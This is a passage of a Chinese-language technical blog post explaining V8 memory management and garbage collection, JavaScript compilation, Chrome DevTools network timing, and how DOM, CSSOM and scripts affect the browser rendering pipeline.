src="https://i.loli.net/2021/06/14/gfdXi2vJHput3xo.jpg" alt="Snipaste_2021-06-14_15-54-55.jpg"></p><p><strong>通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据</strong>。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，<strong>堆空间很大，能存放很多大的数据</strong>，不过缺点是分配内存和回收内存都会占用一定的时间。</p><p>在 JavaScript 中，赋值操作和其他语言有很大的不同，<strong>原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址</strong>。所以<code>d=c</code>的操作就是把 c 的引用地址赋值给 d。</p><h2 id="JavaScript-处理垃圾回收"><a href="#JavaScript-处理垃圾回收" class="headerlink" title="JavaScript 处理垃圾回收"></a>JavaScript 处理垃圾回收</h2><p>通常情况下，垃圾数据回收分为<strong>手动回收</strong>和<strong>自动回收</strong>两种策略。在JavaScript中 <strong>产生的垃圾数据是由垃圾回收器来释放的。</strong></p><h3 id="调用栈中的数据是如何回收的"><a href="#调用栈中的数据是如何回收的" class="headerlink" title="调用栈中的数据是如何回收的"></a>调用栈中的数据是如何回收的</h3><p>首先是调用栈中的数据，还是通过一段示例代码的执行流程来分析其回收机制，具体如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> b = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客邦 &quot;</span>&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="string">&quot; 极客时间 &quot;</span></span><br><span class="line">      <span class="keyword">var</span> d = &#123;<span class="attr">name</span>:<span class="string">&quot; 极客时间 &quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    showName()</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：</p><p><img src="https://i.loli.net/2021/06/14/D9F3peN68g5PG7C.jpg" alt="Snipaste_2021-06-14_15-58-51.jpg"></p><p>如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个<strong>记录当前执行状态的指针（称为 ESP）</strong>，指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。</p><p>接着，当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文。JavaScript 会将 ESP 下移到 foo 函数的执行上下文，<strong>这个下移操作就是销毁 showName 函数执行上下文的过程</strong>。</p><p><img src="https://i.loli.net/2021/06/14/QAW1ZmTXOSxEvMc.jpg" alt="Snipaste_2021-06-14_16-01-56.jpg"></p><p>从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。</p><h3 id="堆中的数据是如何回收的"><a href="#堆中的数据是如何回收的" class="headerlink" title="堆中的数据是如何回收的"></a>堆中的数据是如何回收的</h3><p>当上面那段代码的 foo 函数执行结束之后，ESP 指向全局执行上下文。不过保存在堆中的两个对象依然占用着空间，如下图所示：</p><p><img src="https://i.loli.net/2021/06/14/l4CMFg9DnWY6Vv3.jpg" alt="Snipaste_2021-06-14_16-03-41.jpg"></p><p><strong>要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了</strong>。</p><h4 id="代际假说和分代收集"><a href="#代际假说和分代收集" class="headerlink" title="代际假说和分代收集"></a>代际假说和分代收集</h4><p><strong>代际假说</strong>有以下两个特点：</p><ul><li>第一个是大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；</li><li>第二个是不死的对象，会活得更久。</li></ul><p>在 V8 中会把堆分为<strong>新生代</strong>和<strong>老生代</strong>两个区域，<strong>新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象</strong>。新生区通常只支持 1～8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。</p><ul><li><strong>副垃圾回收器，主要负责新生代的垃圾回收。</strong></li><li><strong>主垃圾回收器，主要负责老生代的垃圾回收。</strong></li></ul><h4 id="垃圾回收器的工作流程"><a href="#垃圾回收器的工作流程" class="headerlink" title="垃圾回收器的工作流程"></a>垃圾回收器的工作流程</h4><p><strong>不论什么类型的垃圾回收器，它们都有一套共同的执行流程</strong>。</p><p>第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。</p><p>第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。</p><p>第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为<strong>内存碎片</strong>。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。</p><h4 id="副垃圾回收器"><a href="#副垃圾回收器" class="headerlink" title="副垃圾回收器"></a>副垃圾回收器</h4><p>通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。</p><p><img src="https://i.loli.net/2021/06/14/sYxBfKQ2dlXUOvD.jpg" alt="Snipaste_2021-06-14_16-08-17.jpg"></p><p>新生代中用<strong>Scavenge 算法</strong>来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域。</p><p>新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。</p><p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p><p>完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种<strong>角色翻转的操作还能让新生代中的这两块区域无限重复使用下去</strong>。</p><p>由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以<strong>为了执行效率，一般新生区的空间会被设置得比较小</strong>。</p><p>也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了<strong>对象晋升策略</strong>，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。</p><h4 id="主垃圾回收器"><a href="#主垃圾回收器" class="headerlink" title="主垃圾回收器"></a>主垃圾回收器</h4><p>一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。</p><p>主垃圾回收器是采用<strong>标记 - 清除（Mark-Sweep）</strong>的算法进行垃圾回收。首先是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为<strong>活动对象</strong>，没有到达的元素就可以判断为<strong>垃圾数据</strong>。</p><p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：</p><p><img src="https://i.loli.net/2021/06/14/5HYsMJtWfvkRIw2.jpg" alt="Snipaste_2021-06-14_16-10-01.jpg"></p><p>不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——<strong>标记 - 整理（Mark-Compact）</strong>，这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。可以参考下图：</p><p><img src="https://i.loli.net/2021/06/14/AJstiWxBMYI6pof.jpg" alt="Snipaste_2021-06-14_16-10-53.jpg"></p><h4 id="全停顿"><a href="#全停顿" class="headerlink" title="全停顿"></a>全停顿</h4><p>一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做<strong>全停顿（Stop-The-World）</strong>。</p><p>在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样。为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为<strong>增量标记（Incremental Marking）算法</strong>。如下图所示：</p><p><img src="https://i.loli.net/2021/06/14/yo1ZYa8LJWk95ze.jpg" alt="Snipaste_2021-06-14_16-12-19.jpg"></p><p>使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行。</p><h2 id="V8-执行代码"><a href="#V8-执行代码" class="headerlink" title="V8 执行代码"></a>V8 执行代码</h2><h3 id="编译器和解释器"><a href="#编译器和解释器" class="headerlink" title="编译器和解释器"></a>编译器和解释器</h3><p><strong>编译型语言</strong>在程序执行之前，需要经过<strong>编译器</strong>的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了。比如 C/C++、GO 等都是编译型语言。</p><p>而由<strong>解释型语言</strong>编写的程序，在每次运行时都需要通过<strong>解释器</strong>对程序进行动态解释和执行。比如 Python、JavaScript 等都属于解释型语言。</p><p><img src="https://i.loli.net/2021/06/14/moU4e59sAfbJ3O7.jpg" alt="Snipaste_2021-06-14_16-14-19.jpg"></p><ul><li>在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。</li><li>在解释型语言的解释过程中，同样解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。</li></ul><h3 id="V8-是如何执行一段-JavaScript-代码的"><a href="#V8-是如何执行一段-JavaScript-代码的" class="headerlink" title="V8 是如何执行一段 JavaScript 代码的"></a>V8 是如何执行一段 JavaScript 代码的</h3><p><img src="https://i.loli.net/2021/06/14/q7Y9LpBNKa3ADGh.jpg" alt="Snipaste_2021-06-14_16-15-31.jpg"></p><p>V8 在执行过程中既有<strong>解释器 Ignition</strong>，又有<strong>编译器 TurboFan</strong></p><h4 id="1-生成抽象语法树（AST）和执行上下文"><a href="#1-生成抽象语法树（AST）和执行上下文" class="headerlink" title="1. 生成抽象语法树（AST）和执行上下文"></a>1. 生成抽象语法树（AST）和执行上下文</h4><p>AST 是非常重要的一种数据结构，在很多项目中有着广泛的应用。其中最著名的一个项目是 Babel。Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。</p><p>除了 Babel 外，还有 ESLint 也使用 AST。ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。</p><p>通常，生成 AST 需要经过两个阶段。</p><p><strong>第一阶段是分词（tokenize），又称为词法分析</strong>，其作用是将一行行的源码拆解成一个个 token。所谓<strong>token</strong>，指的是语法上不可能再分的、最小的单个字符或字符串。</p><p><img src="https://i.loli.net/2021/06/14/vgzrFh48SEIMRoi.jpg" alt="Snipaste_2021-06-14_16-17-33.jpg"></p><p>其中关键字“var”、标识符“myName” 、赋值运算符“=”、字符串“极客时间”四个都是 token。</p><p><strong>第二阶段是解析（parse），又称为语法分析</strong>，其作用是将上一步生成的 token 数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。</p><h4 id="2-生成字节码"><a href="#2-生成字节码" class="headerlink" title="2. 生成字节码"></a>2. 生成字节码</h4><p>字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。</p><p><img src="https://i.loli.net/2021/06/14/s3GzL9VoU8iJFbK.jpg" alt="Snipaste_2021-06-14_16-18-52.jpg"></p><h4 id="3-执行代码"><a href="#3-执行代码" class="headerlink" title="3. 执行代码"></a>3. 执行代码</h4><p>通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为<strong>热点代码</strong>，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。</p><h3 id="JavaScript-的性能优化"><a href="#JavaScript-的性能优化" class="headerlink" title="JavaScript 的性能优化"></a>JavaScript 的性能优化</h3><p>将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：</p><ol><li>提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；</li><li>避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；</li><li>减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。</li></ol><hr><h1 id="浏览器中的页面"><a href="#浏览器中的页面" class="headerlink" title="浏览器中的页面"></a>浏览器中的页面</h1><p>Chrome 开发者工具面板的大致功能：</p><p><img src="https://i.loli.net/2021/06/14/VRJ3q27IDnONWwS.jpg" alt="Snipaste_2021-06-14_19-12-16.jpg"></p><h2 id="网络面板"><a href="#网络面板" class="headerlink" title="网络面板"></a>网络面板</h2><p>网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。</p><p><img src="https://i.loli.net/2021/06/14/uU3TBk5xjIsON8w.jpg" alt="Snipaste_2021-06-14_19-13-14.jpg"></p><h3 id="1-控制器"><a href="#1-控制器" class="headerlink" title="1. 控制器"></a>1. 控制器</h3><p>控制器有 4 个比较重要的功能：</p><p><img src="https://i.loli.net/2021/06/14/jb7PFsvDVniABEk.jpg" alt="Snipaste_2021-06-14_19-13-54.jpg"></p><ul><li>红色圆点的按钮，表示“开始 / 暂停抓包”，这个功能很常见，很容易理解。</li><li>“全局搜索”按钮，这个功能就非常重要了，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个你想要的文件上。</li><li>Disable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。</li><li>Online 按钮，是“模拟 2G/3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网。</li></ul><h3 id="5-详细列表"><a href="#5-详细列表" class="headerlink" title="5. 详细列表"></a>5. 详细列表</h3><p>可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。</p><h3 id="优化时间线上耗时项"><a href="#优化时间线上耗时项" class="headerlink" title="优化时间线上耗时项"></a>优化时间线上耗时项</h3><h4 id="1-排队（Queuing）时间过久"><a href="#1-排队（Queuing）时间过久" class="headerlink" title="1. 排队（Queuing）时间过久"></a>1. 排队（Queuing）时间过久</h4><p>排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为<strong>域名分片</strong>技术。除了域名分片技术外，还可以<strong>把站点升级到 HTTP2</strong>，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制了。</p><h4 id="2-第一字节时间（TTFB）时间过久"><a href="#2-第一字节时间（TTFB）时间过久" class="headerlink" title="2. 第一字节时间（TTFB）时间过久"></a>2. 第一字节时间（TTFB）时间过久</h4><p>这可能的原因有如下：</p><ul><li><strong>服务器生成页面数据的时间过久</strong>。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户。服务器在处理这个数据的过程中，可能某个环节会出问题。</li><li><strong>网络的原因</strong>。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问服务器，这样也会拖慢网速。</li><li><strong>发送请求头时带上了多余的用户信息</strong>。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。</li></ul><p>面对第一种服务器的问题，可以通过增加各种缓存的技术；针对第二种网络问题，可以使用 CDN 来缓存一些静态文件；至于第三种，在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息。</p><h4 id="3-Content-Download-时间过久"><a href="#3-Content-Download-时间过久" class="headerlink" title="3. Content Download 时间过久"></a>3. Content Download 时间过久</h4><p>如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。这时候需要减少文件大小，比如压缩、去掉源码中不必要的注释等方法。</p><h2 id="DOM-树"><a href="#DOM-树" class="headerlink" title="DOM 树"></a><strong>DOM 树</strong></h2><h3 id="什么是-DOM"><a href="#什么是-DOM" class="headerlink" title="什么是 DOM"></a>什么是 DOM</h3><p>从网络传给渲染引擎的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 提供了对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。</p><ul><li>从页面的视角来看，DOM 是生成页面的基础数据结构。</li><li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。</li><li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。</li></ul><p>简言之，DOM 是表述 HTML 的内部数据结构，它会将 Web 页面和 JavaScript 脚本连接起来，并过滤一些不安全的内容。</p><h3 id="DOM-树如何生成"><a href="#DOM-树如何生成" class="headerlink" title="DOM 树如何生成"></a>DOM 树如何生成</h3><p>在渲染引擎内部，有一个叫<strong>HTML 解析器（HTMLParser）</strong>的模块，它负责将 HTML 字节流转换为 DOM 结构。</p><p><strong>网络进程加载了多少数据，HTML 解析器便解析多少数据</strong>：</p><ol><li>网络进程接收到响应头之后，会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text/html”，那么浏览器就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。</li><li>渲染进程准备好之后，<strong>网络进程和渲染进程之间会建立一个共享数据的管道</strong>，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据“喂”给 HTML 解析器。</li></ol><p>你可以把这个管道想象成一个“水管”，网络进程接收到的字节流像水一样倒进这个“水管”，而“水管”的另外一端是渲染进程的 HTML 解析器，它会动态接收字节流，并将其解析为 DOM。</p><p><img src="https://i.loli.net/2021/06/14/5GoDOckhsQNtfWT.jpg" alt="Snipaste_2021-06-14_19-33-34.jpg"></p><p><strong>第一个阶段，通过分词器将字节流转换为 Token。</strong>上述 HTML 代码通过词法分析生成的 Token 如下所示：</p><p><img src="https://i.loli.net/2021/06/14/ugL51BlF6qTsrUO.jpg" alt="Snipaste_2021-06-14_19-34-25.jpg"></p><p><strong>后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。</strong></p><p>HTML 解析器维护了一个<strong>Token 栈结构</strong>，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：</p><ul><li>如果压入到栈中的是<strong>StartTag Token</strong>，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。</li><li>如果分词器解析出来是<strong>文本 Token</strong>，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。</li><li>如果分词器解析出来的是<strong>EndTag 标签</strong>，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。</li></ul><p>补充说明：<strong>HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构</strong>，同时会将一个 StartTag document 的 Token 压入栈底。</p><h3 id="JavaScript-是如何影响-DOM-生成的"><a href="#JavaScript-是如何影响-DOM-生成的" class="headerlink" title="JavaScript 是如何影响 DOM 生成的"></a>JavaScript 是如何影响 DOM 生成的</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">    div1.innerText = <span class="string">&#x27;time.geekbang&#x27;</span></span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在两段 div 中间插入了一段 JavaScript 脚本，这段脚本的解析过程就有点不一样了。<code>标签之前，所有的解析流程还是和之前介绍的一样，但是解析到</code>标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p><p><strong>但如果在页面中引入 JavaScript 文件，这个解析过程就稍微复杂了些：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//foo.js</span><br><span class="line">let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">div1.innerText = &#x27;time.geekbang&#x27;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;foo.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为<strong>JavaScript 文件的下载过程会阻塞 DOM 解析</strong>，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。</p><p>不过 Chrome 浏览器做了很多优化，其中一个主要的优化是<strong>预解析操作</strong>。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p><p>引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码。async 和 defer 虽然都是异步的，不过还有一些差异，使用 <strong>async</strong> 标志的脚本文件一旦加载完成，会<strong>立即执行</strong>；而使用了 <strong>defer</strong> 标记的脚本文件，需要<strong>在 DOMContentLoaded 事件之前执行</strong>。</p><p>接着看另一种情况：</p><p>如果 JavaScript 代码出现了 <code>div1.style.color = ‘red&#39;</code> 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。</p><p>而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，<strong>都会执行 CSS 文件下载、解析操作</strong>，再执行 JavaScript 脚本。</p><p>所以 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。</p><h2 id="渲染流水线"><a href="#渲染流水线" class="headerlink" title="渲染流水线"></a>渲染流水线</h2><h3 id="渲染流水线视角下的-CSS"><a href="#渲染流水线视角下的-CSS" class="headerlink" title="渲染流水线视角下的 CSS"></a>渲染流水线视角下的 CSS</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123; </span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;theme.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>geekbang com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/14/k1RwdbiQVEAPlcJ.jpg" alt="Snipaste_2021-06-14_19-46-45.jpg"></p><p>首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。<strong>需要特别注意</strong>，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。</p><p>当渲染进程接收 HTML 文件字节流时，会先开启一个<strong>预解析线程</strong>，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间<strong>需要注意一下</strong>，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。</p><p><strong>那渲染流水线为什么需要 CSSOM 呢？</strong></p><p>和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，<strong>第一个是提供给 JavaScript 操作样式表的能力，第二个是为布局树的合成提供基础的样式信息</strong>。这个 CSSOM 体现在 DOM 中就是 <code> document.styleSheets</code>。</p><p>若在之前代码基础上，又在 body 标签内部加了一个简单的 JavaScript ：</p><p><img src="https://i.loli.net/2021/06/14/z2WU6qpEyVRbTMr.jpg" alt="Snipaste_2021-06-14_19-49-33.jpg"></p><p>若HTML 文件中包含了 CSS 的外部引用和 JavaScript 外部文件：</p><p><img src="https://i.loli.net/2021/06/14/HtTJbBIjoe72VPQ.jpg" alt="Snipaste_2021-06-14_19-53-59.jpg"></p><p>在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。</p><p>不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。</p><h3 id="影响页面展示的因素以及优化策略"><a href="#影响页面展示的因素以及优化策略" class="headerlink" title="影响页面展示的因素以及优化策略"></a>影响页面展示的因素以及优化策略</h3><p>渲染流水线影响到了首次页面展示的速度，而首次页面展示的速度又直接影响到了用户体验。</p><p>从发起 URL 